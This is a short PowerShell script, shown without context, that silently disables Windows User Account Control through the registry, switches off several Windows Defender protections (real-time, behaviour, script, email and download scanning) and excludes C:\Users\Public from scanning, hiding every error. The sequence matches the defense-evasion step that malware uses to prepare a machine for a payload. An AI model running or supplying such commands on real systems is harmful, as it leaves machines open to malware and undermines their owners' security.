reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f 2>$null
Set-MpPreference -DisableRealtimeMonitoring $true -EA 0
Set-MpPreference -DisableIOAVProtection $true -EA 0
Set-MpPreference -DisableBehaviorMonitoring $true -EA 0
Set-MpPreference -DisableBlockAtFirstSeen $true -EA 0
Set-MpPreference -DisableEmailScanning $true -EA 0
Set-MpPreference -DisableScriptScanning $true -EA 0
Add-MpPreference -ExclusionPath 'C:\Users\Public' -EA 0
